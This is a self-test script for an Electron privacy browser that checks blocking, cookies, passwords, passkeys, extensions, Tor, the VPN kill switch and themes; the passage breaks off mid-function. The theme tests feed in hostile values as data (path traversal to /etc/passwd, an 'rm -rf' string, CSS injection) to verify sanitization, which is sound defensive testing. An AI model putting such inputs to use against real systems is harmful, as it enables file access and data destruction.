'use strict';
// End-to-end checks of VRK against the real browser, using a throwaway config
// folder. Run with `npm run selftest`; VRK_SELFTEST_SKIP=net,tor,vpn,ext skips
// the slower or network-dependent parts.

const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const { app, BrowserWindow } = require('electron');

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const skip = new Set((process.env.VRK_SELFTEST_SKIP || '').split(',').filter(Boolean));

module.exports = async function selftest({ browser, shield, tor, vpn, vault, bookmarks, importer, settings, history, themes, profileDir }) {
  const results = [];
  const check = (name, pass, detail = '') => {
    results.push({ name, pass: Boolean(pass) });
    console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`);
  };
  const info = (name, detail) => console.log(`INFO  ${name}: ${detail}`);
  browser.confirmExtensionInstall = async () => true; // no dialogs in the self-test
  // Record uncaught errors (instead of Electron's error dialog) and fail on them.
  const uncaught = [];
  process.on('uncaughtException', (err) => {
    uncaught.push(err.stack || String(err));
    console.log(`UNCAUGHT ${err.stack || err}`);
  });

  const frameCookies = [];
  let lastReferer = null;
  const server = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://local');
    res.setHeader('content-type', 'text/html');
    if (url.pathname === '/headers') {
      res.setHeader('content-type', 'application/json');
      return res.end(JSON.stringify(req.headers));
    }
    if (url.pathname === '/top') {
      return res.end(`<!doctype html><title>top</title>
        <script>window.addEventListener('message', (e) => { window.frameReport = e.data; });</script>
        <iframe src="http://localhost:${port}/frame"></iframe>
        <script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
        <script src="https://www.googletagmanager.com/gtag/js?id=G-TEST123"></script>
        <img src="https://www.facebook.com/tr?id=1&ev=PageView">`);
    }
    if (url.pathname === '/frame') {
      frameCookies.push(req.headers.cookie || '');
      res.setHeader('Set-Cookie', 'hdr=1; SameSite=None; Secure; Path=/');
      return res.end(`<script>
        const before = document.cookie;
        document.cookie = 'js=1; SameSite=None; Secure; Path=/';
        parent.postMessage({ before, after: document.cookie }, '*');
      </script>`);
    }
    if (url.pathname === '/popup') {
      return res.end(`<script>window.popupResult = String(window.open('/headers', 'p', 'width=320,height=320'));</script>`);
    }
    if (url.pathname === '/fp') {
      return res.end(`<!doctype html><title>fp</title>
        <iframe id="same" src="/fpframe"></iframe><iframe id="blank"></iframe>
        <script>
          function draw(doc) {
            const c = doc.createElement('canvas');
            c.width = 220; c.height = 60;
            const x = c.getContext('2d');
            x.textBaseline = 'top'; x.font = '16px Arial';
            x.fillStyle = '#f60'; x.fillRect(10, 10, 100, 30);
            x.fillStyle = '#069'; x.fillText('VRK fingerprint test', 4, 20);
            x.strokeStyle = 'rgba(120,20,200,0.7)'; x.beginPath(); x.arc(160, 30, 20, 0, Math.PI * 2); x.stroke();
            return c.toDataURL();
          }
          window.fp = async () => {
            const ctx = new OfflineAudioContext(1, 5000, 44100);
            const osc = ctx.createOscillator();
            osc.type = 'triangle'; osc.frequency.value = 10000;
            const comp = ctx.createDynamicsCompressor();
            osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
            const data = (await ctx.startRendering()).getChannelData(0);
            let audio = 0;
            for (let i = 4500; i < 5000; i++) audio += Math.abs(data[i]);
            return {
              a: draw(document), b: draw(document),
              same: draw(document.getElementById('same').contentWindow.document),
              blank: draw(document.getElementById('blank').contentWindow.document),
              audio, cores: navigator.hardwareConcurrency,
              native: HTMLCanvasElement.prototype.toDataURL.toString() + ' ' + Function.prototype.toString.toString(),
            };
          };
        </script>`);
    }
    if (url.pathname === '/fpframe') return res.end('<!doctype html><title>frame</title>');
    if (url.pathname === '/passkey') {
      return res.end(`<!doctype html><title>passkey</title>
        <input id="user" autocomplete="username webauthn" style="width:300px;height:30px">
        <script>
          const b = (s) => Uint8Array.from(atob(s.replace(/-/g, '+').replace(/_/g, '/')), (c) => c.charCodeAt(0));
          window.register = async (challenge, opts = {}) => {
            try {
              const c = await navigator.credentials.create({ publicKey: {
                rp: { name: 'VRK Test', ...(opts.rpId ? { id: opts.rpId } : {}) },
                user: { id: b('dXNlci0x'), name: 'tester@example.com', displayName: 'Tester' },
                challenge: b(challenge),
                pubKeyCredParams: [{ type: 'public-key', alg: -7 }, { type: 'public-key', alg: -257 }],
                authenticatorSelection: { residentKey: 'required', userVerification: 'required' },
                excludeCredentials: (opts.exclude || []).map((id) => ({ type: 'public-key', id: b(id) })),
                extensions: { credProps: true },
              } });
              return { ok: true, json: c.toJSON(), isPKC: c instanceof PublicKeyCredential, alg: c.response.getPublicKeyAlgorithm(), ext: c.getClientExtensionResults() };
            } catch (e) { return { ok: false, name: e.name }; }
          };
          window.login = async (challenge) => {
            try {
              const c = await navigator.credentials.get({ publicKey: { challenge: b(challenge), rpId: 'localhost', userVerification: 'required' } });
              return { ok: true, json: c.toJSON(), isPKC: c instanceof PublicKeyCredential };
            } catch (e) { return { ok: false, name: e.name }; }
          };
          window.conditional = (challenge) => {
            window.condResult = null;
            navigator.credentials.get({ mediation: 'conditional', publicKey: { challenge: b(challenge) } })
              .then((c) => { window.condResult = { ok: true, json: c.toJSON() }; }, (e) => { window.condResult = { ok: false, name: e.name }; });
            return true;
          };
        </script>`);
    }
    if (url.pathname === '/signup') {
      return res.end(`<!doctype html><title>Sign up</title><form>
        <input name="email" type="email" autocomplete="username" style="width:300px;height:30px">
        <input id="p1" type="password" autocomplete="new-password" style="width:300px;height:30px">
        <input id="p2" type="password" name="confirm_password" style="width:300px;height:30px">
        <button>Create account</button></form>`);
    }
    if (url.pathname.startsWith('/dl/')) {
      res.setHeader('content-type', 'application/octet-stream');
      res.setHeader('content-disposition', `attachment; filename="${path.basename(url.pathname)}"`);
      return res.end(url.searchParams.get('body') || 'VRK download test');
    }
    if (url.pathname === '/js') return res.end(`<!doctype html><title>no script</title><script>document.title = 'script ran'</script>`);
    if (url.pathname === '/banner') {
      return res.end(`<!doctype html><title>banner</title>
        <div id="onetrust-banner-sdk"><p>We use cookies.</p><button id="onetrust-accept-btn-handler" onclick="window.accepted = true">Accept</button><button id="onetrust-reject-all-handler" onclick="window.rejected = 'onetrust'">Reject All</button></div>`);
    }
    if (url.pathname === '/late-banner') {
      return res.end(`<!doctype html><title>late</title><p>Article</p>
        <script>setTimeout(() => { const d = document.createElement('div'); d.className = 'cookie-notice'; d.innerHTML = '<span>Cookies?</span><button onclick="window.lateRejected = true">Reject all</button>'; document.body.append(d); }, 1500);</script>`);
    }
    if (url.pathname === '/not-a-banner') return res.end(`<!doctype html><div class="modal"><button onclick="window.declined = true">Decline</button></div>`);
    if (url.pathname === '/seen') {
      lastReferer = req.headers.referer || '';
      return res.end('ok');
    }
    if (url.pathname === '/refer') return res.end(`<!doctype html><meta name="referrer" content="unsafe-url"><title>refer</title>`);
    if (url.pathname === '/otp') return res.end(`<!doctype html><title>Verify</title><form><input id="otp" autocomplete="one-time-code" inputmode="numeric" style="width:200px;height:30px"></form>`);
    if (url.pathname === '/otp-boxes') {
      return res.end(`<!doctype html><title>Verify</title><form>${'<input class="d" maxlength="1" inputmode="numeric" style="width:30px;height:30px">'.repeat(6)}</form>`);
    }
    if (url.pathname === '/bait') {
      return res.end(`<!doctype html><title>bait</title>
        <div id="bait" class="adsbox textads" style="height:40px">ad</div>
        <script src="/js/ads.js"></script>`);
    }
    if (url.pathname === '/js/ads.js') {
      res.setHeader('content-type', 'text/javascript');
      return res.end('window.baitLoaded = true;');
    }
    if (url.pathname === '/login') {
      return res.end(`<!doctype html><title>Sign in</title><body style="margin:40px">
        <form onsubmit="event.preventDefault(); document.title = 'Signed in'">
          <input id="user" name="username" type="email" autocomplete="username" style="width:300px;height:30px"><br><br>
          <input id="pass" name="password" type="password" style="width:300px;height:30px"><br><br>
          <button id="go" type="submit">Sign in</button>
        </form></body>`);
    }
    res.statusCode = 404;
    res.end();
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  const local = `http://127.0.0.1:${port}`;

  async function waitIdle(tab, timeout = 30000) {
    const deadline = Date.now() + timeout;
    await wait(400);
    while (Date.now() < deadline) {
      if (!tab.pendingUrl && !tab.loading && !tab.wc.isLoading()) return true;
      await wait(200);
    }
    return false;
  }
  async function open(url, options = {}) {
    const tab = browser.createTab(url, options);
    await waitIdle(tab, options.timeout);
    return tab;
  }
  const js = (tab, code) => tab.wc.executeJavaScript(code, true).catch((err) => `ERROR ${err.message}`);
  const bodyJson = async (tab) => {
    try {
      return JSON.parse(await js(tab, 'document.body.innerText'));
    } catch {
      return null;
    }
  };

  try {
    // Wait for startup cleanup and extensions before testing pages.
    for (let i = 0; i < 100 && !browser.normalPrepared; i += 1) await wait(100);
    check('Main profile ready (cleanup + extensions loaded)', browser.normalPrepared && browser.extensions.ready);
    const uiErrors = [];
    browser.ui.on('console-message', (event) => event.level === 'error' && uiErrors.push(event.message));

    // ── 0. Browser UI: every settings section renders ──
    browser.openSettings();
    await wait(800);
    const sections = {};
    for (const name of ['general', 'security', 'appearance', 'search', 'privacy', 'passwords', 'extensions', 'import', 'network', 'about']) {
      await browser.ui.executeJavaScript(`settingsGoTo(${JSON.stringify(name)})`);
      await wait(400);
      sections[name] = await browser.ui.executeJavaScript(`document.querySelector('#settings-content .section-title')?.textContent || ''`);
    }
    check('Every settings section renders', Object.values(sections).every(Boolean), Object.values(sections).join(' · '));
    await browser.ui.executeJavaScript(`settingsGoTo('appearance')`);
    for (let i = 0; i < 30 && !(await browser.ui.executeJavaScript(`!!document.querySelector('.swatch[title="teal"]')`)); i += 1) await wait(100);
    await browser.ui.executeJavaScript(`document.querySelector('.swatch[title="teal"]').click()`);
    await wait(300);
    check('Settings controls change settings', settings.get('accent') === 'teal' && (await browser.ui.executeJavaScript(`document.body.dataset.accent`)) === 'teal');
    settings.set('accent', 'violet');
    browser.createTab(); // leave settings open in the background

    // ── 1. Identity & privacy headers ──
    const headersTab = await open(`${local}/headers`);
    const headers = (await bodyJson(headersTab)) || {};
    const ua = headers['user-agent'] || '';
    check('User agent looks like plain Chrome', /Chrome\/\d+\.0\.0\.0 Safari/.test(ua) && !/Electron|VRK/i.test(ua), ua);
    check('Client hints say Google Chrome', /"Google Chrome";v="\d+"/.test(headers['sec-ch-ua'] || '') && headers['sec-ch-ua-platform'] === '"macOS"', headers['sec-ch-ua']);
    check('Sends Global Privacy Control header', headers['sec-gpc'] === '1');
    const page = JSON.parse(
      await js(
        headersTab,
        `navigator.userAgentData.getHighEntropyValues(['fullVersionList']).then((v) => JSON.stringify({
          brands: navigator.userAgentData.brands.map((b) => b.brand),
          full: v.fullVersionList.map((b) => b.brand + ' ' + b.version),
          gpc: navigator.globalPrivacyControl,
          chrome: Object.keys(window.chrome || {}),
          loadTimes: typeof chrome.loadTimes === 'function' && typeof chrome.loadTimes().requestTime === 'number',
          openNative: String(window.open).includes('[native code]'),
        }))`,
      ),
    );
    check('JavaScript reports the same Chrome brands', page.brands.includes('Google Chrome') && page.brands.length === 3, page.brands.join(', '));
    check('Full version list includes Google Chrome', page.full.some((b) => b.startsWith(`Google Chrome ${process.versions.chrome}`)), page.full.join(', '));
    check('window.chrome looks like Chrome’s', ['app', 'csi', 'loadTimes'].every((k) => page.chrome.includes(k)) && page.loadTimes, page.chrome.join(', '));
    check('Patched functions still look native', page.openNative);
    check('navigator.globalPrivacyControl is true', page.gpc === true);

    // ── 2. Ad blocking & cookies ──
    const top = await open(`${local}/top`);
    await wait(800);
    check('Blocks ads & trackers', top.blocked >= 3, `${top.blocked} requests blocked on test page`);
    top.wc.reload();
    await waitIdle(top);
    await wait(800);
    const report = await js(top, 'window.frameReport');
    check('Third-party cookie headers stripped', frameCookies.length >= 2 && frameCookies.every((c) => !c), JSON.stringify(frameCookies));
    check('Third-party iframe cannot keep cookies via JavaScript', report && !String(report.before).includes('js=1'), JSON.stringify(report));

    // ── 3. Popups ──
    const popupTab = await open(`${local}/popup`);
    await wait(800);
    const popupWindows = () => BrowserWindow.getAllWindows().filter((w) => w !== browser.win && !w.isDestroyed() && w.isVisible());
    const unprompted = await js(popupTab, 'window.popupResult');
    check('Blocks popups opened without a click', unprompted === 'null' && popupWindows().length === 0, `${unprompted}, ${popupWindows().length} window(s)`);
    await popupTab.wc.executeJavaScript(`window.open('/headers', 'p2', 'width=320,height=320') !== null`, true); // simulated click
    await wait(800);
    const popups = BrowserWindow.getAllWindows().filter((w) => w !== browser.win && w.webContents.getURL().includes('/headers'));
    check('Allows popups opened by a click', popups.length === 1);
    check('Popups share their opener tab session', popups.length && popups.every((w) => w.webContents.session === popupTab.wc.session));
    for (const w of popups) w.destroy();

    // ── 4. Password manager ──
    const login = await open(`${local}/login`);
    browser.activate(login.id);
    await js(login, `document.getElementById('user').value = 'tester@example.com'; document.getElementById('pass').value = 'correct horse battery'; document.getElementById('go').click();`);
    await wait(500);
    const offer = [...browser.passwordOffers.entries()].find(([, o]) => o.username === 'tester@example.com');
    check('Offers to save a password on sign-in', Boolean(offer), offer ? offer[1].origin : 'no offer');
    if (offer) browser.answerPasswordOffer(offer[0], 'save', true);
    check('Saves it (encrypted) and keeps the site signed in', vault.forOrigin(local).length === 1 && settings.get('keepSites').includes('127.0.0.1'), `vault encrypted: ${vault.persistent}`);
    login.wc.reload();
    await waitIdle(login);
    await js(login, `document.getElementById('user').focus()`);
    await wait(600);
    const panel = JSON.parse(await js(login, `JSON.stringify(document.querySelector('vrk-autofill')?.getBoundingClientRect() || null)`));
    check('Shows saved logins on the sign-in field', Boolean(panel));
    if (panel) {
      await login.wc.executeJavaScriptInIsolatedWorld(999, [{ code: "document.querySelector('vrk-autofill').vrkSelect(0)" }]);
      await wait(300);
      check('Pages can’t see the autofill internals', (await js(login, "typeof document.querySelector('vrk-autofill')?.vrkSelect")) === 'undefined');
      const filled = JSON.parse(await js(login, `JSON.stringify([document.getElementById('user').value, document.getElementById('pass').value])`));
      check('Fills username and password when picked', filled[0] === 'tester@example.com' && filled[1] === 'correct horse battery', JSON.stringify(filled));
    }

    // ── 5. Bookmarks & settings ──
    browser.activate(headersTab.id);
    browser.toggleBookmark();
    check('Bookmarks the current page', Boolean(bookmarks.findByUrl(headersTab.url)));
    browser.toggleBookmark();
    check('Removes it again', !bookmarks.findByUrl(headersTab.url));

    if (!skip.has('net')) {
      settings.set('stripTrackingParams', false);
      const kept = await open('https://example.com/?utm_source=news&keep=1');
      settings.set('stripTrackingParams', true);
      check('Settings apply instantly (tracking stripping off)', kept.wc.getURL().includes('utm_source=news'), kept.wc.getURL());

      // ── 6. HTTPS-only & tracking parameters ──
      const upgraded = await open('http://example.com/');
      check('Upgrades http:// to https://', upgraded.wc.getURL().startsWith('https://example.com'), upgraded.wc.getURL());
      const cleaned = await open('https://example.com/?utm_source=news&keep=1&fbclid=abc123');
      check('Strips tracking parameters', cleaned.wc.getURL() === 'https://example.com/?keep=1', cleaned.wc.getURL());
      const noHttps = await open('http://neverssl.com/', { timeout: 40000 });
      if (!noHttps.error && noHttps.wc.getURL().startsWith('https://')) {
        info('HTTPS fallback', 'neverssl.com answered over HTTPS this run, so there was nothing to fall back from');
      } else {
        check('Offers insecure fallback when a site has no HTTPS', Boolean(noHttps.error?.insecureUrl), noHttps.error?.insecureUrl || noHttps.wc.getURL());
      }
      if (noHttps.error?.insecureUrl) {
        const offered = new URL(noHttps.error.insecureUrl);
        const committed = [];
        noHttps.wc.on('did-navigate', (_event, url) => committed.push(url));
        browser.activate(noHttps.id);
        browser.loadInsecure();
        for (let i = 0; i < 100 && !committed.length; i += 1) await wait(200); // neverssl.com can be slow
        const first = committed[0] ? new URL(committed[0]) : null;
        check('Loads over HTTP after the user allows it', first?.protocol === 'http:' && first.hostname === offered.hostname && !noHttps.error, committed.join(' → '));
      }

      // ── 7. Google sign-in page ──
      const google = await open('https://accounts.google.com/', { timeout: 40000 });
      await wait(2500);
      const signIn = JSON.parse(
        await js(google, `JSON.stringify({ url: location.href, field: !!document.querySelector('input[type=email], #identifierId'), text: document.body.innerText.slice(0, 200) })`),
      );
      check('Google’s sign-in page loads normally', signIn.field && !/not secure|isn.t supported|browser or app may not/i.test(signIn.text), signIn.url.slice(0, 80));
      const googleHeaders = (await bodyJson(await open('https://httpbin.org/headers', { timeout: 30000 })))?.headers || {};
      check('HTTPS requests carry Chrome client hints', /Google Chrome/.test(googleHeaders['Sec-Ch-Ua'] || ''), googleHeaders['Sec-Ch-Ua']);
    }

    // ── 8a. Extensions: a local test extension (content script, background, storage) ──
    const extDir = fs.mkdtempSync(path.join(os.tmpdir(), 'vrk-test-ext-'));
    fs.writeFileSync(path.join(extDir, 'manifest.json'), JSON.stringify({
      manifest_version: 3, name: 'VRK Test Extension', version: '1.0', permissions: ['storage'],
      background: { service_worker: 'bg.js' }, action: { default_title: 'VRK Test', default_popup: 'popup.html' },
      content_scripts: [{ matches: ['<all_urls>'], js: ['cs.js'], run_at: 'document_end' }],
    }));
    fs.writeFileSync(path.join(extDir, 'bg.js'), `chrome.runtime.onMessage.addListener((m, s, reply) => {
        if (m.tabs) { Promise.all([chrome.tabs.query({ active: true, currentWindow: true }), chrome.windows.getCurrent()]).then(([t, w]) => reply({ tab: t[0] && t[0].id, window: w.id })); return true; }
        chrome.storage.local.set({ seen: m.ping }).then(() => reply({ pong: m.ping })); return true; });
      chrome.action.setBadgeText({ text: '7' });
      chrome.action.setBadgeBackgroundColor({ color: '#ff0000' });
      chrome.contextMenus.create({ id: 'vrk-test', title: 'VRK Test Item', contexts: ['page'] });`);
    fs.writeFileSync(path.join(extDir, 'popup.html'), '<!doctype html><body style="width:200px;height:80px">VRK popup</body>');
    fs.writeFileSync(path.join(extDir, 'cs.js'), `const d = document.documentElement.dataset; d.vrkExt = 'ran';
      chrome.storage.local.get('seen').then((v) => { d.vrkExtSeen = String(v.seen); chrome.runtime.sendMessage({ ping: 7 }, (r) => { d.vrkExtReply = JSON.stringify(r || null); }); });`);
    const testExt = await browser.extensions.installFile(extDir);
    fs.rmSync(extDir, { recursive: true, force: true });
    const extPage = await open(`${local}/headers`);
    await wait(1500);
    const extResult = JSON.parse(await js(extPage, `JSON.stringify(document.documentElement.dataset)`));
    check('Extension content scripts run on pages', extResult.vrkExt === 'ran');
    check('Content scripts talk to the extension’s background', extResult.vrkExtReply === '{"pong":7}', extResult.vrkExtReply);
    // VRK's own extension host (no GPL library): toolbar badges, tabs and windows, menus, popups.
    const host = browser.extensions.api;
    const button = host.toolbarState().find((a) => a.id === testExt.id);
    check('Extension buttons reach the toolbar, with their badge', button && button.text === '7' && button.title === 'VRK Test', JSON.stringify(button));
    const sw = [...host.workers.values()].find((w) => w.id === testExt.id);
    check('Extensions’ background workers get VRK’s APIs', Boolean(sw));
    const menuItems = host.contextMenuItems(extPage.wc, { pageURL: `${local}/headers`, mediaType: 'none', selectionText: '', linkURL: '', isEditable: false, frameURL: '' });
    check('Extension right-click menu items appear', menuItems.some((i) => i.label === 'VRK Test Item'));
    const tabInfo = host.tabInfo(browser.extensions.session.extensions.getExtension(testExt.id), extPage.wc);
    check('Extensions see tabs, but not their addresses without permission', tabInfo.id === extPage.wc.id && tabInfo.url === undefined);
    host.activate(testExt.id, { x: 600, y: 40, width: 30, height: 30 }, false);
    await wait(1200);
    check('Clicking an extension button opens its popup', host.popup && !host.popup.isDestroyed() && host.popup.webContents.getURL().endsWith('/popup.html'));
    host.closePopup();

    // ── 8b. Extensions from the three stores ──
    if (!skip.has('ext') && !skip.has('net')) {
      const { installExtension } = require('electron-chrome-web-store');
      const darkReader = await installExtension('eimadpbcbfnmbkopoojfekhnkhdbieeh', { session: browser.normal.session, extensionsPath: browser.extensions.dir }).catch((e) => e);
      check('Installs from the Chrome Web Store (Dark Reader)', darkReader?.id === 'eimadpbcbfnmbkopoojfekhnkhdbieeh', darkReader?.message || darkReader?.version);
      await wait(1500);
      const themed = await open('https://example.com/');
      await wait(3000);
      const injected = await js(themed, `document.querySelectorAll('style.darkreader').length`);
      info('Dark Reader theming pages', injected > 0 ? 'yes' : 'not yet (known issue: its document-targeted messaging)');

      const edge = await browser.extensions.installFromEdge('odfafepnkmbhccpbejgmiehpchacaeak').catch((e) => e);
      check('Installs from Edge Add-ons (signature verified)', Boolean(edge?.id), edge?.message || `${edge?.name} ${edge?.version}`);
      const firefox = await browser.extensions.installFromFirefox('darkreader').catch((e) => e);
      info('Firefox Add-ons (experimental) — Dark Reader', firefox?.id ? `loaded ${firefox.name} ${firefox.version}` : firefox?.message);
      const list = browser.extensions.list();
      info('Installed extensions', list.map((e) => `${e.name} [${e.source}${e.enabled ? '' : ', off'}]`).join('; '));
      if (edge?.id) {
        await browser.extensions.setEnabled(edge.id, false);
        check('Extensions can be turned off', !browser.normal.session.extensions.getExtension(edge.id));
        await browser.extensions.remove(edge.id);
        check('…and removed', !browser.extensions.list().some((e) => e.id === edge.id));
      }
    }

    // ── 9. Tor tabs ──
    if (!skip.has('tor') && !skip.has('net') && tor.available) {
      const direct = await open('https://check.torproject.org/api/ip');
      const directIp = await bodyJson(direct);
      const torTab = browser.createTab('https://check.torproject.org/api/ip', { tor: true });
      check('Tor tab waits (fail closed) until Tor is ready', torTab.pendingUrl && torTab.profile.gate === 'tor');
      const started = Date.now();
      await waitIdle(torTab, 180000);
      info('Tor bootstrap + first load', `${Math.round((Date.now() - started) / 1000)}s`);
      const torIp = await bodyJson(torTab);
      check('Tor tab exits through Tor', torIp?.IsTor === true, JSON.stringify(torIp));
      check('Normal tab does not use Tor', directIp?.IsTor === false && directIp?.IP !== torIp?.IP, JSON.stringify(directIp));
      const onion = await open('https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/', { tor: true, timeout: 120000 });
      check('Tor tab reaches .onion services', /duckduckgo/i.test(onion.title), onion.title || JSON.stringify(onion.error));
      check('No extensions or password manager in Tor tabs', !torTab.wc.session.extensions.getAllExtensions().length);
    }

    // ── 10. VPN kill switch ──
    if (!skip.has('vpn') && vpn.available) {
      const key = () => crypto.randomBytes(32).toString('base64');
      const conf = path.join(os.tmpdir(), `vrk-test-${process.pid}.conf`);
      fs.writeFileSync(conf, `[Interface]\nPrivateKey = ${key()}\nAddress = 10.66.0.2/32\n\n[Peer]\nPublicKey = ${key()}\nEndpoint = 127.0.0.1:9\nAllowedIPs = 0.0.0.0/0\n`);
      const entry = vpn.importConfig(conf);
      fs.rmSync(conf);
      check('VPN config is stored encrypted', !fs.readFileSync(vpn.storeFile, 'utf8').includes('PrivateKey') && Boolean(entry.secret));
      const connecting = browser.vpnConnect(entry.id);
      await wait(300);
      check('Kill switch engages while the VPN connects', browser.normal.gate === 'vpn', `vpn ${vpn.state}`);
      const held = browser.createTab(`${local}/headers`);
      await wait(500);
      check('Navigation is held, not sent outside the VPN', held.pendingUrl === `${local}/headers` && held.wc.getURL() === '', `waiting=${held.profile.gate}`);
      await connecting;
      check('Unreachable VPN server leaves traffic blocked', vpn.state === 'error' && browser.normal.gate === 'vpn', vpn.lastError);
      await browser.vpnDisconnect();
      await waitIdle(held);
      check('Turning the VPN off releases held tabs', held.wc.getURL() === `${local}/headers`, held.wc.getURL());
      vpn.removeConfig(entry.id);
    }

    // ── 11. Clear on quit (Private mode) & Burn keep only chosen sign-ins ──
    settings.setMode('private');
    const ses = browser.normal.session;
    const dropPage = await open(`http://localhost:${port}/headers`);
    await js(dropPage, `localStorage.setItem('tracker', 'x')`);
    const keepPage = await open(`${local}/headers`);
    await js(keepPage, `localStorage.setItem('session', 'y')`);
    await ses.cookies.set({ url: 'https://keep.example/', name: 'session', value: 'k', expirationDate: Date.now() / 1000 + 3600 });
    await ses.cookies.set({ url: 'https://drop.example/', name: 'session', value: 'd', expirationDate: Date.now() / 1000 + 3600 });
    settings.keepSite('keep.example', true);
    await browser.prepareQuit();
    const afterQuit = (await ses.cookies.get({})).map((c) => c.domain);
    check('Quitting erases site cookies except kept sign-ins', afterQuit.includes('keep.example') && !afterQuit.includes('drop.example'), afterQuit.join(', '));
    check('Quitting closes pages before erasing', !browser.tabs.has(dropPage.id) && !browser.tabs.has(keepPage.id));
    const dropAgain = await open(`http://localhost:${port}/headers`);
    const keepAgain = await open(`${local}/headers`);
    check('Quitting erases site storage', (await js(dropAgain, `localStorage.getItem('tracker')`)) === null);
    check('…but keeps storage for sites you stay signed in to', (await js(keepAgain, `localStorage.getItem('session')`)) === 'y');
    const extAgain = await open(`${local}/headers`);
    await wait(1000);
    check('Extension data survives quitting', (await js(extAgain, `document.documentElement.dataset.vrkExtSeen`)) === '7');
    await ses.cookies.set({ url: 'https://drop.example/', name: 'session', value: 'd', expirationDate: Date.now() / 1000 + 3600 });
    await browser.burn();
    await wait(300);
    const afterBurn = (await ses.cookies.get({})).map((c) => c.domain);
    check('Burn closes every tab and opens a fresh one', browser.tabs.size === 1 && [...browser.tabs.values()][0].isNewTab);
    check('Burn erases everything except kept sign-ins', afterBurn.includes('keep.example') && !afterBurn.includes('drop.example'), afterBurn.join(', '));

    // ── 12. Standard mode, history & suggestions ──
    settings.setMode('standard');
    const { Settings } = require('../src/settings');
    const oldPrefs = path.join(os.tmpdir(), `vrk-old-prefs-${process.pid}.json`);
    fs.writeFileSync(oldPrefs, JSON.stringify({ clearOnQuit: true, accent: 'pink' }));
    const migrated = new Settings(oldPrefs);
    check('Older settings move to Standard mode (history on), keeping your other choices', migrated.mode() === 'standard' && migrated.get('accent') === 'pink' && JSON.parse(fs.readFileSync(oldPrefs, 'utf8')).settingsVersion === 3);
    fs.rmSync(oldPrefs, { force: true });
    history.clear();
    const visited = await open(`${local}/login`);
    await wait(500);
    const entry = history.list({ limit: 5 }).find((v) => v.url === `${local}/login`);
    check('Standard mode records history with page titles', entry?.title === 'Sign in', JSON.stringify(entry));
    const dbBytes = fs.readFileSync(path.join(path.dirname(vpn.storeFile), 'history.db')).toString('latin1');
    check('History is encrypted on disk', history.persistent && !dbBytes.includes('/login') && !dbBytes.includes('Sign in'));
    const { items, completion } = browser.computeSuggestions('127.0.0');
    check('Address bar suggests from history, with inline completion', items.some((i) => i.url === `${local}/login`) && completion?.startsWith('127.0.0.1'), `${completion} · ${items.map((i) => i.kind).join(',')}`);
    browser.activate(visited.id);
    await browser.ui.executeJavaScript(`(() => { const a = document.getElementById('address'); a.focus(); a.value = 'Sign'; a.dispatchEvent(new InputEvent('input', { inputType: 'insertText' })); })()`);
    await wait(700);
    const pickIndex = browser.suggestions.findIndex((i) => i.kind === 'history');
    check('Suggestion list floats above the page', browser.suggestVisible && pickIndex >= 0, `${browser.suggestions.length} suggestions`);
    const blank = browser.createTab();
    browser.pickSuggestion(pickIndex);
    await waitIdle(blank);
    check('Picking a suggestion opens it', blank.wc.getURL() === `${local}/login` && !browser.suggestVisible, blank.wc.getURL());
    browser.closeTab(blank.id);
    browser.reopenClosedTab();
    await wait(800);
    check('Reopen Closed Tab brings it back', [...browser.tabs.values()].some((t) => t.wc.getURL() === `${local}/login` && t.id !== visited.id && t.id !== blank.id));
    settings.setMode('private');
    const before = history.count;
    await open(`${local}/headers?private`);
    check('Private mode records no history', history.count === before && settings.get('clearOnQuit'));
    settings.setMode('standard');
    browser.openInternal('history');
    await wait(900);
    check('History page lists visits', (await browser.ui.executeJavaScript(`document.querySelectorAll('#historypanel .history-row').length`)) > 0);

    // ── 13. Themes, backgrounds and the theme editor ──
    check('Built-in themes are available', themes.list().filter((t) => t.builtIn).length === 9);
    const png = path.join(os.tmpdir(), `vrk-bg-${process.pid}.png`);
    fs.writeFileSync(png, Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAFklEQVR4nGP4z8DwnwEIGBgY/v8HAQAzxQb6s8M3TwAAAABJRU5ErkJggg==', 'base64'));
    const media = themes.importMedia(png);
    fs.rmSync(png);
    const custom = themes.save({ ...themes.get('midnight-aurora'), id: undefined, name: 'Test image theme', builtIn: undefined, glass: 0.4, background: { ...themes.get('midnight-aurora').background, type: 'image', media: media.name } });
    settings.set('themeId', custom.id);
    browser.activate(browser.createTab().id);
    await wait(900);
    const applied = JSON.parse(await browser.ui.executeJavaScript(`JSON.stringify({ custom: document.body.dataset.custom, glass: document.body.dataset.glass, bg: getComputedStyle(document.querySelector('#app-bg .bg-base') || document.body).backgroundImage })`));
    check('Image backgrounds apply across the browser', applied.custom === '1' && applied.glass === '1' && applied.bg.includes('vrk://media/'), JSON.stringify(applied));
    const rangedResponse = browser.serveMedia(new Request(`vrk://media/${media.name}`, { headers: { Range: 'bytes=0-9' } }), media.name);
    const ranged = { status: rangedResponse.status, range: rangedResponse.headers.get('content-range'), bytes: (await rangedResponse.arrayBuffer()).byteLength };
    check('Media streams with byte ranges (for video)', ranged.status === 206 && /^bytes 0-9\/\d+$/.test(ranged.range) && ranged.bytes === 10, JSON.stringify(ranged));
    const escape = browser.serveMedia(new Request('vrk://media/../prefs.json'), '../prefs.json');
    check('Media can’t reach files outside the Media folder', escape.status === 404);
    const hostile = themes.save({ name: 'x'.repeat(500), colors: { accent: 'red; } body { display:none', bg: '#123456' }, background: { type: 'evil', media: '../../etc/passwd', effect: { kind: 'rm -rf', speed: 1e9 } }, css: 'a{}'.repeat(10000) });
    check('Theme files are sanitized', hostile.colors.accent === '#8b7bff' && hostile.colors.bg === '#123456' && hostile.background.type === 'gradient' && hostile.background.media === null && hostile.background.effect.kind === 'none' && hostile.background.effect.speed === 4 && hostile.css.length === 20000 && hostile.name.length === 60);
    themes.remove(hostile.id);
    const effectErrors = await browser.ui.executeJavaScript(`(async () => {
      const box = document.createElement('div');
      box.style.cssText = 'position:fixed;left:0;top:0;width:320px;height:200px';
      document.body.append(box);
      const errors = [];
